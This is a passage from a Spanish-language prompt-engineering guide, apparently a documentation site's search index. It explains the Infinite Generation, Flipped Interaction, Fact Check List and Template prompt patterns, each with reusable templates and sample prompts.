tarea.\n2. Para cada enfoque listado, explica brevemente los \"Pros\" y los \"Contras\".\n3. Preg\u00fantame qu\u00e9 enfoque me gustar\u00eda utilizar antes de que generes tu respuesta.\n</code></pre> <p>Definir el alcance</p> <p>El \u201cscope\u201d (estudiante de primer a\u00f1o de psicolog\u00eda) es el marco de restricciones dentro del cual el LLM debe proponer alternativas.</p>"},{"location":"Patron-de-Generacion-Infinita/","title":"El Patr\u00f3n de Generaci\u00f3n Infinita","text":""},{"location":"Patron-de-Generacion-Infinita/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>La intenci\u00f3n de este patr\u00f3n es generar autom\u00e1ticamente una serie de resultados (que pueden parecer infinitos) sin tener que volver a introducir el prompt cada vez. El objetivo es reducir la cantidad de texto que el usuario debe escribir para obtener la siguiente salida, partiendo de la idea de que no quiere repetir constantemente la instrucci\u00f3n inicial. En algunas variaciones, la intenci\u00f3n es permitir que el usuario conserve un prompt base o plantilla inicial, pero a\u00f1ada variaciones adicionales mediante entradas nuevas antes de cada resultado generado.</p>"},{"location":"Patron-de-Generacion-Infinita/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>Muchas tareas requieren usar el mismo prompt varias veces, por ejemplo, al generar c\u00f3digo para operaciones CRUD (crear, leer, actualizar y eliminar) de diferentes entidades, se necesita aplicar la misma instrucci\u00f3n repetidamente. Si el usuario tiene que escribir el prompt una y otra vez, es f\u00e1cil que cometa errores. El patr\u00f3n de Generaci\u00f3n Infinita evita esto, ya que permite reutilizar el mismo prompt de manera autom\u00e1tica, con o sin entradas adicionales, para producir m\u00faltiples resultados siguiendo ciertas reglas.</p>"},{"location":"Patron-de-Generacion-Infinita/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Me gustar\u00eda que generaras salidas de forma indefinida, X salida(s) a la vez (Opcional) as\u00ed es como debes usar la entrada que proporcione entre las salidas (Opcional) detente cuando te lo pida <p>La primera instrucci\u00f3n aclara que el usuario puede pedir al modelo (LLM) que genere resultados de manera indefinida, lo que implica que el mismo prompt se reutilizar\u00e1 continuamente. Para evitar que la salida sea demasiado extensa, el usuario puede indicar un l\u00edmite, por ejemplo: genera X resultados a la vez. Este control es crucial porque los modelos tienen restricciones de longitud en sus respuestas. Si se genera demasiado contenido de una sola vez, se corre el riesgo de superar esas limitaciones. Al establecer cu\u00e1ntos resultados se producen en cada ciclo, el usuario mantiene un flujo continuo de generaci\u00f3n, pero con un ritmo manejable y seguro.</p> <p>La segunda instrucci\u00f3n del patr\u00f3n describe c\u00f3mo el usuario puede dar entradas adicionales entre cada bloque de generaci\u00f3n. Al definir c\u00f3mo se incorporan esas entradas, el usuario crea una estrategia que aprovecha la retroalimentaci\u00f3n para ajustar la siguiente salida sin perder el contexto del prompt original. El prompt inicial sigue siendo la base de la generaci\u00f3n, pero cada nueva entrada del usuario se integra en \u00e9l para refinar los resultados. La incorporaci\u00f3n de estas entradas se hace siguiendo reglas claras, lo que asegura consistencia y control en la variaci\u00f3n de las salidas.</p> <p>La tercera declaraci\u00f3n proporciona una forma opcional para que el usuario detenga el proceso de generaci\u00f3n de salida. Este paso no siempre es necesario, pero puede ser \u00fatil en situaciones donde exista la posibilidad de ambig\u00fcedad sobre si la entrada proporcionada por el usuario constituye un refinamiento para la siguiente generaci\u00f3n o un comando para detenerse. Por ejemplo si el usuario est\u00e1 generando datos sobre se\u00f1ales de tr\u00e1nsito y escribe \u201cstop\u201d, el sistema podr\u00eda interpretarlo como:</p> <ul> <li>Un refinamiento (a\u00f1adir una se\u00f1al de \u201cStop\u201d a la salida).</li> <li>O una orden para detener la generaci\u00f3n.</li> </ul> <p>Para evitar esa ambig\u00fcedad, se establece una frase clara que indique cu\u00e1ndo se debe detener el proceso.</p>"},{"location":"Patron-de-Generacion-Infinita/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>El siguiente es un ejemplo de prompt de generaci\u00f3n infinita para producir una serie de URLs:</p> <p>\u201cDe ahora en adelante, quiero que generes un nombre y un cargo hasta que yo diga basta. Voy a proporcionar una plantilla para tu salida. Todo lo que est\u00e9 en may\u00fasculas es un marcador de posici\u00f3n. Cada vez que generes texto, intenta colocarlo en uno de los marcadores de posici\u00f3n que enumero. Por favor, conserva el formato y la plantilla general que proporciono: <code>https://myapi.com/NOMBRE/perfil/TRABAJO</code>\u201d.</p> <p>Este prompt combina la funcionalidad del patr\u00f3n de Generaci\u00f3n Infinita con el patr\u00f3n de Plantilla. El usuario pide al modelo que genere de manera continua un nombre y un cargo laboral hasta que se le indique expl\u00edcitamente basta. Los resultados generados se formatean dentro de la plantilla proporcionada, la cual incluye espacios reservados para el nombre y el cargo. Gracias al patr\u00f3n de Generaci\u00f3n Infinita, el usuario recibe m\u00faltiples resultados sin tener que volver a introducir la plantilla cada vez. Al mismo tiempo, el patr\u00f3n de Plantilla asegura que todos los resultados mantengan un formato consistente.</p>"},{"location":"Patron-de-Generacion-Infinita/#5-consecuencias","title":"5. Consecuencias","text":"<p>En cada paso, el modelo recibe la salida anterior y la nueva instrucci\u00f3n del usuario. Como el contexto que se conserva es limitado, con el tiempo puede perder de vista el prompt original. Esto puede hacer que el modelo se desv\u00ede del comportamiento esperado o empiece a repetir respuestas. Por eso es importante que el usuario supervise las salidas y d\u00e9 retroalimentaci\u00f3n correctiva cuando sea necesario.</p>"},{"location":"Patron-de-Generacion-Infinita/#6-plantilla","title":"6. Plantilla","text":"PLANTILLA<pre><code>A partir de la siguiente instrucci\u00f3n que te d\u00e9, aplica **[PATR\u00d3N]** a todas tus respuestas de manera indefinida, hasta que escriba &gt;&gt;STOP&lt;&lt;.\n</code></pre>"},{"location":"Patron-de-Generacion-Infinita/#7-ejemplos","title":"7. Ejemplos","text":""},{"location":"Patron-de-Generacion-Infinita/#identificacion-de-errores","title":"IDENTIFICACI\u00d3N DE ERRORES","text":""},{"location":"Patron-de-Generacion-Infinita/#el-patron-de-lista-de-verificacion-de-hechos","title":"El Patr\u00f3n de Lista de Verificaci\u00f3n de Hechos","text":"Generaci\u00f3n infinita de lista de hechos<pre><code>A partir de la siguiente instrucci\u00f3n que te d\u00e9, aplica **INSTRUCCIONES DE VERIFICACI\u00d3N** a todas tus respuestas de manera indefinida, hasta que escriba &gt;&gt;STOP&lt;&lt;.\n\n## INSTRUCCIONES DE VERIFICACI\u00d3N\n\n**Una vez generada la respuesta**, a\u00f1ade un separador y una secci\u00f3n titulada \"\u2705 LISTA DE VERIFICACI\u00d3N DE HECHOS\". En ella debes detallar:\n1. Extrae y enumera los hechos cr\u00edticos mencionados expl\u00edcitamente en tu respuesta (solo los que aparecen en el texto). Se debe incluir solo los hechos que, si fueran incorrectos, comprometer\u00edan la veracidad de la informaci\u00f3n (por ejemplo, fechas, nombres t\u00e9cnicos o estad\u00edsticas). \n2. Ordena los hechos de mayor a menor impacto en la confiabilidad de la respuesta.\n3. Cada \u00edtem debe ser una afirmaci\u00f3n factual breve.\n4. **Advertencia:** No agregues hechos nuevos en la lista que no est\u00e9n en el texto de tu respuesta.\n</code></pre> Donde un n\u00famero equivocado es peligroso<pre><code>\u00bfCu\u00e1l es la dosis segura de Paracetamol para un adulto de 70kg y cu\u00e1les son los s\u00edntomas de sobredosis?\n</code></pre> Seguridad Alimentaria<pre><code>\u00bfA qu\u00e9 temperatura interna exacta debo cocinar un pollo entero para que sea seguro comerlo?\n</code></pre>"},{"location":"Patron-de-Generacion-Infinita/#el-patron-de-reflexion","title":"El Patr\u00f3n de Reflexi\u00f3n","text":"Generaci\u00f3n infinita de reflexi\u00f3n<pre><code>A partir de la siguiente instrucci\u00f3n que te d\u00e9, aplica **INSTRUCCIONES DE REFLEXI\u00d3N** a todas tus respuestas de manera indefinida, hasta que escriba &gt;&gt;STOP&lt;&lt;.\n\n## INSTRUCCIONES DE REFLEXI\u00d3N\n\n**Una vez generada la respuesta**, a\u00f1ade un separador y una secci\u00f3n titulada \"\ud83d\udd0d REFLEXI\u00d3N INTERNA\". En ella debes detallar:\n1. El razonamiento paso a paso que seguiste.\n2. Las suposiciones que hiciste sobre mi contexto o intenciones.\n3. Cualquier limitaci\u00f3n o posible ambig\u00fcedad en tu respuesta.\n4. Soluciones consideradas pero descartadas.\n</code></pre> Cubo de Rubik<pre><code>\u00bfCu\u00e1ntos movimientos m\u00ednimos se necesitan para resolver un cubo de Rubik 3\u00d73?\n</code></pre> La Trampa Cultural<pre><code>\u00bfCu\u00e1nto debo dejar de propina en un restaurante por un buen servicio?\n</code></pre>"},{"location":"Patron-de-Generacion-Infinita/#mejora-del-prompt","title":"MEJORA DEL PROMPT","text":""},{"location":"Patron-de-Generacion-Infinita/#el-patron-de-refinamiento-de-pregunta","title":"El Patr\u00f3n de Refinamiento de Pregunta","text":"Generaci\u00f3n infinita de refinamiento<pre><code>A partir de la siguiente instrucci\u00f3n que te d\u00e9, aplica **PROTOCOLO DE REFINAMIENTO** a todas tus respuestas de manera indefinida, hasta que escriba &gt;&gt;STOP&lt;&lt;.\n\n## PROTOCOLO DE REFINAMIENTO\n\nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Sugiere una mejor versi\u00f3n de mi pregunta.\n2. Explica brevemente POR QU\u00c9 tu versi\u00f3n es mejor.\n3. Cons\u00faltame si quiero usar la versi\u00f3n que tu proporcionas.\n</code></pre> N\u00famero de Huesos<pre><code>\u00bfCu\u00e1ntos huesos tiene el cuerpo humano?\n</code></pre> N\u00famero de Paises<pre><code>\u00bfCu\u00e1ntos pa\u00edses hay en el mundo?\n</code></pre>"},{"location":"Patron-de-Generacion-Infinita/#el-patron-de-enfoques-alternativos","title":"El Patr\u00f3n de Enfoques Alternativos","text":"Generaci\u00f3n infinita de enfoques alternativos<pre><code>A partir de la siguiente instrucci\u00f3n que te d\u00e9, aplica **PROTOCOLO DE ENFOQUES ALTERNATIVOS** a todas tus respuestas de manera indefinida, hasta que escriba &gt;&gt;STOP&lt;&lt;.\n\n## PROTOCOLO DE ENFOQUES ALTERNATIVOS\n\nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Lista 3 enfoques radicalmente diferentes para resolver la tarea.\n2. Para cada enfoque listado, explica brevemente los \"Pros\" y los \"Contras\".\n3. Preg\u00fantame qu\u00e9 enfoque me gustar\u00eda utilizar antes de que generes tu respuesta.\n</code></pre> Estudiante de primer a\u00f1o de psicolog\u00eda<pre><code>Explica el concepto de \"Inteligencia Artificial Generativa\". Asume que soy estudiante de primer a\u00f1o de psicolog\u00eda.\n</code></pre>"},{"location":"Patron-de-Generacion-Infinita/#el-patron-de-verificador-cognitivo","title":"El Patr\u00f3n de Verificador Cognitivo","text":"Generaci\u00f3n infinita de verificaci\u00f3n cognitiva<pre><code>A partir de la siguiente instrucci\u00f3n que te d\u00e9, aplica **ESTRATEGIA DE VERIFICACI\u00d3N COGNITIVA** a todas tus respuestas de manera indefinida, hasta que escriba &gt;&gt;STOP&lt;&lt;.\n\n## ESTRATEGIA DE VERIFICACI\u00d3N COGNITIVA \n\nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Para que puedas responder con precisi\u00f3n, genera 3 preguntas adicionales que necesites que yo responda para aclarar el contexto. \n2. Una vez que yo responda, combina esa nueva informaci\u00f3n para producir la respuesta final y completa.\n</code></pre> La Excusa Perfecta<pre><code>Genera una excusa cre\u00edble para no ir a la fiesta de cumplea\u00f1os de mi jefe este s\u00e1bado.\n</code></pre> El P\u00e1nico del Aniversario<pre><code>Olvid\u00e9 que ma\u00f1ana mi esposa y yo estamos de aniversario. Dime qu\u00e9 comprar r\u00e1pido.\n</code></pre>"},{"location":"Patron-de-Interaccion-Invertida/","title":"El Patr\u00f3n de Interacci\u00f3n Invertida","text":""},{"location":"Patron-de-Interaccion-Invertida/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>Se desea que el LLM formule preguntas para obtener la informaci\u00f3n necesaria para realizar una tarea. En lugar de que el usuario conduzca la conversaci\u00f3n, se busca que el LLM la dirija para enfocarse en lograr un objetivo espec\u00edfico. Por ejemplo, es posible que desee que el LLM le haga una prueba r\u00e1pida o que le formule preguntas autom\u00e1ticamente hasta reunir suficiente informaci\u00f3n para generar un script de despliegue para su aplicaci\u00f3n en un entorno de nube particular.</p>"},{"location":"Patron-de-Interaccion-Invertida/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>En lugar de que el usuario dirija la conversaci\u00f3n, un LLM a menudo posee conocimientos que puede aprovechar para obtener informaci\u00f3n del usuario con mayor precisi\u00f3n. El objetivo del patr\u00f3n de Interacci\u00f3n Invertida es invertir el flujo de la interacci\u00f3n para que sea el LLM quien haga preguntas al usuario con el fin de alcanzar una meta deseada. A menudo, el LLM puede seleccionar mejor el formato, la cantidad y el contenido de las interacciones para garantizar que el objetivo se alcance m\u00e1s r\u00e1pido, con mayor precisi\u00f3n y/o utilizando conocimientos que el usuario podr\u00eda no poseer inicialmente.</p>"},{"location":"Patron-de-Interaccion-Invertida/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Me gustar\u00eda que me hicieras preguntas para lograr X Debes hacer preguntas hasta que se cumpla esta condici\u00f3n o para lograr este objetivo (alternativamente, indefinidamente) (Opcional) hazme las preguntas de una en una, de dos en dos, etc. <p>Un prompt para una interacci\u00f3n invertida siempre debe especificar el objetivo de la interacci\u00f3n. La primera idea (que el LLM haga preguntas para lograr un objetivo) comunica esta meta al modelo. Igualmente importante es que las preguntas se centren en un tema o resultado particular. Al proporcionar el objetivo, el LLM puede entender qu\u00e9 se intenta lograr y adaptar sus preguntas en consecuencia. Esta \"inversi\u00f3n de control\" permite una interacci\u00f3n m\u00e1s enfocada y eficiente, ya que el LLM solo formular\u00e1 las preguntas que considere relevantes para lograr el objetivo especificado.</p> <p>La segunda idea proporciona el contexto sobre la duraci\u00f3n de la interacci\u00f3n. Una interacci\u00f3n invertida puede terminarse con una respuesta como \"deja de hacer preguntas\". Sin embargo, a menudo es mejor acotar la interacci\u00f3n a una longitud razonable o hasta alcanzar la meta. Este objetivo puede ser sorprendentemente abierto (open-ended), y el LLM continuar\u00e1 trabajando hacia la meta haciendo preguntas, como ocurre en el ejemplo de \"hasta que tengas suficiente informaci\u00f3n para generar un script de Python\" .</p> <p>Por defecto, es probable que el LLM genere m\u00faltiples preguntas por iteraci\u00f3n. La tercera idea es opcional, pero puede mejorar la usabilidad al limitar (o expandir) el n\u00famero de preguntas que el LLM genera por ciclo. Si no se especifica un n\u00famero o formato preciso para la secuencia de preguntas, este ser\u00e1 semi-aleatorio (ej. de una en una o de diez en diez). Por lo tanto, el prompt puede adaptarse para incluir el n\u00famero de preguntas formuladas a la vez y su orden para facilitar la interacci\u00f3n .</p>"},{"location":"Patron-de-Interaccion-Invertida/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>A continuaci\u00f3n se muestra un ejemplo de prompt para una interacci\u00f3n invertida:</p> <p>\u201cDe ahora en adelante, me gustar\u00eda que me hicieras preguntas para desplegar una aplicaci\u00f3n de Python en AWS. Cuando tengas suficiente informaci\u00f3n para desplegar la aplicaci\u00f3n, crea un script de Python para automatizar el despliegue\u201d.</p> <p>En general, cuanto m\u00e1s espec\u00edfico sea el prompt respecto a las restricciones e informaci\u00f3n a recopilar, mejor ser\u00e1 el resultado. Por ejemplo, el prompt anterior podr\u00eda proporcionar un men\u00fa de servicios de AWS posibles (como Lambda, EC2, etc.). En otros casos, se puede permitir que el LLM simplemente tome decisiones apropiadas por su cuenta sobre aspectos que el usuario no decida expl\u00edcitamente.</p> <p>Una limitaci\u00f3n de este prompt es que, una vez proporcionada otra informaci\u00f3n contextual, puede requerir experimentaci\u00f3n con el fraseo preciso para lograr que el LLM haga las preguntas en el n\u00famero y flujo adecuados (ej. m\u00faltiples preguntas a la vez frente a una por turno).</p>"},{"location":"Patron-de-Interaccion-Invertida/#5-consecuencias","title":"5. Consecuencias","text":"<p>Una consideraci\u00f3n al dise\u00f1ar el prompt es cu\u00e1nto dictar al LLM sobre la informaci\u00f3n a recopilar antes de finalizar. En el ejemplo anterior, la interacci\u00f3n es abierta, lo que hace al prompt gen\u00e9rico y reutilizable, pero podr\u00eda derivar en preguntas innecesarias si se omite contexto clave.</p> <p>Si se conocen requisitos espec\u00edficos de antemano, es mejor inyectarlos en el prompt en lugar de esperar que el LLM los deduzca. De lo contrario, el LLM decidir\u00e1 de manera no determinista si solicitar la informaci\u00f3n o realizar una conjetura fundamentada sobre un valor apropiado. Por ejemplo, especificar \"desplegar en Amazon AWS EC2\" evita m\u00faltiples rondas de preguntas para acotar el objetivo \"la nube\". Cuanto m\u00e1s precisa sea la informaci\u00f3n inicial, mejor podr\u00e1 usar el LLM las preguntas limitadas para mejorar su salida.</p> <p>Al desarrollar prompts para interacciones invertidas, es importante considerar el nivel de conocimiento, compromiso y control del usuario. Si el objetivo es minimizar la interacci\u00f3n del usuario (control m\u00ednimo) o maximizar su confirmaci\u00f3n de decisiones (compromiso m\u00e1ximo), esto debe indicarse expl\u00edcitamente. Asimismo, si se espera que el usuario tenga un conocimiento m\u00ednimo, esta restricci\u00f3n debe incorporarse expl\u00edcitamente en el dise\u00f1o del prompt para ajustar el nivel de las preguntas .</p>"},{"location":"Patron-de-Interaccion-Invertida/#6-plantilla","title":"6. Plantilla","text":"PLANTILLA<pre><code>[OBJETIVO GENERAL]\n## ESTRATEGIA DE INTERACCI\u00d3N INVERTIDA(FLIPPED INTERACTION)\n\nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores.  En su lugar:\n\n1. Preg\u00fantame todo lo que necesites saber para completar la tarea con la m\u00e1xima calidad.\n2. Haz las preguntas de una en una y espera mi respuesta antes de hacer la siguiente.\n3. Contin\u00faa preguntando hasta que tengas suficiente informaci\u00f3n. Solo entonces, genera el RESULTADO FINAL.\n\nHazme la primera pregunta.\n</code></pre>"},{"location":"Patron-de-Interaccion-Invertida/#7-ejemplos","title":"7. Ejemplos","text":"Haz lo que quieras<pre><code>Ay\u00fadame a interpretar qu\u00e9 quiso decir mi novia con su \u00faltimo mensaje: \"Haz lo que quieras \ud83d\udc4d\"\n\n## ESTRATEGIA DE INTERACCI\u00d3N INVERTIDA(FLIPPED INTERACTION)\n\nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores.  En su lugar:\n\n1. Preg\u00fantame todo lo que necesites saber para completar la tarea con la m\u00e1xima calidad.\n2. Haz las preguntas de una en una y espera mi respuesta antes de hacer la siguiente.\n3. Contin\u00faa preguntando hasta que tengas suficiente informaci\u00f3n. Solo entonces, genera el RESULTADO FINAL.\n\nHazme la primera pregunta. \n</code></pre> Cr\u00edtica art\u00edstica profunda<pre><code>Generar una cr\u00edtica art\u00edstica profunda, filos\u00f3fica y exageradamente compleja (al estilo de un curador de museo snob) sobre un dibujo objetivamente feo que acaba de hacer un ni\u00f1o de 4 a\u00f1os.\n\n## ESTRATEGIA DE INTERACCI\u00d3N INVERTIDA(FLIPPED INTERACTION)\n\nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores.  En su lugar:\n\n1. Preg\u00fantame todo lo que necesites saber para completar la tarea con la m\u00e1xima calidad.\n2. Haz las preguntas de una en una y espera mi respuesta antes de hacer la siguiente.\n3. Contin\u00faa preguntando hasta que tengas suficiente informaci\u00f3n. Solo entonces, genera el RESULTADO FINAL.\n\nHazme la primera pregunta. \n</code></pre>"},{"location":"Patron-de-Lista-de-Verificacion-de-Hechos/","title":"El Patr\u00f3n de Lista de Verificaci\u00f3n de Hechos (Fact Check List)","text":""},{"location":"Patron-de-Lista-de-Verificacion-de-Hechos/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>El prop\u00f3sito de este patr\u00f3n es asegurar que el LLM genere una lista de los hechos presentes en la salida y que forman una parte importante de las declaraciones en dicha salida. Esta lista de hechos ayuda a informar al usuario sobre los datos (o suposiciones) en los que se basa la salida. El usuario puede entonces realizar la debida diligencia (due diligence) sobre estos hechos/suposiciones para validar la veracidad de la salida.</p>"},{"location":"Patron-de-Lista-de-Verificacion-de-Hechos/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>Una debilidad actual de los LLMs (incluido ChatGPT) es que a menudo generan, de manera r\u00e1pida (\u00a1e incluso entusiasta!), texto convincente que es f\u00e1cticamente incorrecto. Estos errores pueden adoptar una amplia gama de formas, desde estad\u00edsticas falsas hasta n\u00fameros de versi\u00f3n inv\u00e1lidos para dependencias de librer\u00edas de software. Debido a la naturaleza convincente de este texto generado, es posible que los usuarios no realicen la debida diligencia necesaria para determinar su exactitud.</p>"},{"location":"Patron-de-Lista-de-Verificacion-de-Hechos/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Genera un conjunto de hechos que est\u00e9n contenidos en la salida El conjunto de hechos debe insertarse en un punto espec\u00edfico de la salida El conjunto de hechos debe componerse de los hechos fundamentales que podr\u00edan socavar la veracidad de la salida si alguno de ellos fuera incorrecto <p>Una diferencia posible en la aplicaci\u00f3n del patr\u00f3n est\u00e1 en d\u00f3nde se presentan los hechos dentro de la salida del modelo. Como los hechos pueden incluir t\u00e9rminos que el usuario no conoce, se sugiere que la lista de hechos aparezca despu\u00e9s del resultado principal. Este orden permite que el usuario primero lea y entienda la respuesta, y luego vea qu\u00e9 afirmaciones deben verificarse. Adem\u00e1s, el usuario puede identificar hechos adicionales mientras analiza la respuesta, antes de revisar la lista final que debe comprobarse.</p>"},{"location":"Patron-de-Lista-de-Verificacion-de-Hechos/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>A continuaci\u00f3n se muestra un ejemplo del patr\u00f3n de Lista de Verificaci\u00f3n de Hechos:</p> <p>\u201cDe ahora en adelante, cuando generes una respuesta, crea un conjunto de hechos de los que dependa la respuesta, que deban ser verificados y enumera este conjunto de hechos al final de tu salida. Solo incluye hechos relacionados con la ciberseguridad\u201d.</p> <p>El usuario puede tener experiencia en algunos temas relacionados con la pregunta, pero no en otros. La lista de verificaci\u00f3n de hechos puede adaptarse a temas en los que el usuario no tiene tanta experiencia o donde existe el mayor riesgo. Por ejemplo, en el prompt anterior, el usuario est\u00e1 delimitando la lista de verificaci\u00f3n de hechos a temas de seguridad, ya que estos son probablemente muy importantes desde una perspectiva de riesgo y pueden no ser bien comprendidos por el desarrollador. Dirigir los hechos de esta manera tambi\u00e9n reduce la carga cognitiva del usuario al listar potencialmente menos elementos para investigar.</p>"},{"location":"Patron-de-Lista-de-Verificacion-de-Hechos/#5-consecuencias","title":"5. Consecuencias","text":"<p>El patr\u00f3n de Lista de Verificaci\u00f3n de Hechos debe emplearse siempre que los usuarios no sean expertos en el dominio para el cual est\u00e1n generando la salida. Por ejemplo, un desarrollador de software que revisa c\u00f3digo podr\u00eda beneficiarse de que el modelo le sugiera consideraciones de seguridad mediante una lista de hechos a verificar. Por el contrario, es probable que un experto en arquitectura de software identifique errores en las declaraciones sobre la estructura del software y no necesite ver una lista de verificaci\u00f3n de hechos para esas salidas.</p> <p>Todos los modelos de lenguaje (LLM) pueden producir errores, por lo que el patr\u00f3n Fact Check List resulta \u00fatil para reforzar la fiabilidad. Se sugiere combinarlo con el patr\u00f3n de Question Refinement, lo que permite que las respuestas sean m\u00e1s precisas y, adem\u00e1s, verificables.  El patr\u00f3n facilita que el usuario compare directamente la lista de hechos con la salida del modelo:</p> <ul> <li>Puede comprobar si los hechos listados realmente aparecen en la respuesta.</li> <li>Puede detectar si faltan hechos importantes (omisiones). Aunque la lista tambi\u00e9n puede contener errores, normalmente el usuario tiene suficiente conocimiento y contexto para evaluar si es completa y correcta en relaci\u00f3n con la salida.</li> </ul> <p>Una advertencia sobre el patr\u00f3n de Lista de Verificaci\u00f3n de Hechos es que solo se aplica cuando el tipo de salida es susceptible a la verificaci\u00f3n de hechos. Por ejemplo, el patr\u00f3n funciona al pedirle a ChatGPT que genere un archivo \u201crequirements.txt\u201d de Python, ya que enumerar\u00e1 las versiones de las librer\u00edas como hechos que deben verificarse, lo cual es \u00fatil dado que las versiones suelen contener errores. Sin embargo, ChatGPT se negar\u00e1 a generar una lista de verificaci\u00f3n de hechos para un ejemplo de c\u00f3digo e indicar\u00e1 que esto es algo que no puede verificar, a pesar de que el c\u00f3digo pueda contener errores.</p>"},{"location":"Patron-de-Lista-de-Verificacion-de-Hechos/#6-plantilla","title":"6. Plantilla","text":"PLANTILLA<pre><code>[TAREA / PREGUNTA]\n## INSTRUCCIONES DE VERIFICACI\u00d3N\n**Una vez generada la respuesta**, a\u00f1ade un separador y una secci\u00f3n titulada \"\u2705 LISTA DE VERIFICACI\u00d3N DE HECHOS\". En ella debes detallar:\n1. Extrae y enumera los hechos cr\u00edticos mencionados expl\u00edcitamente en tu respuesta (solo los que aparecen en el texto). Se debe incluir solo los hechos que, si fueran incorrectos, comprometer\u00edan la veracidad de la informaci\u00f3n (por ejemplo, fechas, nombres t\u00e9cnicos o estad\u00edsticas). \n2. Ordena los hechos de mayor a menor impacto en la confiabilidad de la respuesta.\n3. Cada \u00edtem debe ser una afirmaci\u00f3n factual breve.\n4. **Advertencia:** No agregues hechos nuevos en la lista que no est\u00e9n en el texto de tu respuesta.\n</code></pre>"},{"location":"Patron-de-Lista-de-Verificacion-de-Hechos/#7-ejemplos","title":"7. Ejemplos","text":"Donde un n\u00famero equivocado es peligroso<pre><code>\u00bfCu\u00e1l es la dosis segura de Paracetamol para un adulto de 70kg y cu\u00e1les son los s\u00edntomas de sobredosis?\n## INSTRUCCIONES DE VERIFICACI\u00d3N\n**Una vez generada la respuesta**, a\u00f1ade un separador y una secci\u00f3n titulada \"\u2705 LISTA DE VERIFICACI\u00d3N DE HECHOS\". En ella debes detallar:\n1. Extrae y enumera los hechos cr\u00edticos mencionados expl\u00edcitamente en tu respuesta (solo los que aparecen en el texto). Se debe incluir solo los hechos que, si fueran incorrectos, comprometer\u00edan la veracidad de la informaci\u00f3n (por ejemplo, fechas, nombres t\u00e9cnicos o estad\u00edsticas). \n2. Ordena los hechos de mayor a menor impacto en la confiabilidad de la respuesta.\n3. Cada \u00edtem debe ser una afirmaci\u00f3n factual breve.\n4. **Advertencia:** No agregues hechos nuevos en la lista que no est\u00e9n en el texto de tu respuesta.\n</code></pre> Seguridad Alimentaria<pre><code>\u00bfA qu\u00e9 temperatura interna exacta debo cocinar un pollo entero para que sea seguro comerlo?\n## INSTRUCCIONES DE VERIFICACI\u00d3N\n**Una vez generada la respuesta**, a\u00f1ade un separador y una secci\u00f3n titulada \"\u2705 LISTA DE VERIFICACI\u00d3N DE HECHOS\". En ella debes detallar:\n1. Extrae y enumera los hechos cr\u00edticos mencionados expl\u00edcitamente en tu respuesta (solo los que aparecen en el texto). Se debe incluir solo los hechos que, si fueran incorrectos, comprometer\u00edan la veracidad de la informaci\u00f3n (por ejemplo, fechas, nombres t\u00e9cnicos o estad\u00edsticas). \n2. Ordena los hechos de mayor a menor impacto en la confiabilidad de la respuesta.\n3. Cada \u00edtem debe ser una afirmaci\u00f3n factual breve.\n4. **Advertencia:** No agregues hechos nuevos en la lista que no est\u00e9n en el texto de tu respuesta.\n</code></pre>"},{"location":"Patron-de-Plantilla/","title":"El Patr\u00f3n de Plantilla (Template Pattern)","text":""},{"location":"Patron-de-Plantilla/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>La intenci\u00f3n de este patr\u00f3n es asegurar que la salida de un LLM siga una plantilla precisa en t\u00e9rminos estructurales. Por ejemplo, el usuario podr\u00eda necesitar generar una URL con informaci\u00f3n espec\u00edfica dentro de la ruta de la misma. Este patr\u00f3n permite instruir al LLM para que produzca su salida en un formato que, ordinariamente, no utilizar\u00eda para el tipo de contenido solicitado.</p>"},{"location":"Patron-de-Plantilla/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>En algunos casos, la salida debe generarse en un formato preciso, espec\u00edfico de una aplicaci\u00f3n o caso de uso, que el LLM desconoce. Dado que el modelo no es consciente de la estructura de la plantilla, se le debe instruir sobre cu\u00e1l es el formato y d\u00f3nde deben ubicarse las diferentes partes de su respuesta. Esto podr\u00eda aplicarse a una estructura de datos de muestra que se est\u00e1 generando, una serie de cartas modelo que se est\u00e1n rellenando, etc..</p>"},{"location":"Patron-de-Plantilla/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Voy a proporcionar una plantilla para tu salida X es mi marcador de posici\u00f3n (placeholder) para el contenido Intenta ajustar la salida en uno o m\u00e1s de los marcadores de posici\u00f3n que enumero Por favor, conserva el formato y la plantilla general que proporciono Esta es la plantilla: [PATR\u00d3N con MARCADORES DE POSICI\u00d3N] <p>La primera declaraci\u00f3n dirige al LLM a seguir una plantilla espec\u00edfica. Esta se usar\u00e1 para intentar forzar las respuestas del modelo hacia una estructura consistente con las necesidades de formato del usuario. Este patr\u00f3n es necesario cuando el formato de destino es desconocido para el LLM . Si el modelo ya conoce el formato (ej. un tipo de archivo espec\u00edfico), el patr\u00f3n puede omitirse especificando simplemente dicho formato. No obstante, en casos como la generaci\u00f3n de Javascript Object Notation (JSON), donde existe gran variaci\u00f3n en la representaci\u00f3n de los datos, la plantilla sirve para asegurar que el resultado cumpla con las restricciones adicionales del usuario.</p> <p>La segunda declaraci\u00f3n advierte al LLM que la plantilla contiene un conjunto de marcadores de posici\u00f3n. Los usuarios 